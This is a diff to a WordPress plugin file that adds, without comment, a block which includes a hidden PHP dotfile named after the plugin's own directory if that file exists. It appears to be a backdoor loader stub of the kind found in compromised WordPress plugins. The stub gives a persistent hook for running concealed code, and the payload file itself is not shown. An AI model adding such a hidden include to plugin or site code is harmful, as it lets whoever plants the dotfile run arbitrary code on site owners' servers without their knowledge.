@@ -19,7 +19,11 @@ if( !defined('ABSPATH') ) {
  *
  * @since 2.3.0
  *
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wbcr_factory_clearfy_236_subscribe($plugin_instance)
 {
 	$plugin_name = $plugin_instance->request->post('plugin_name', null, true);
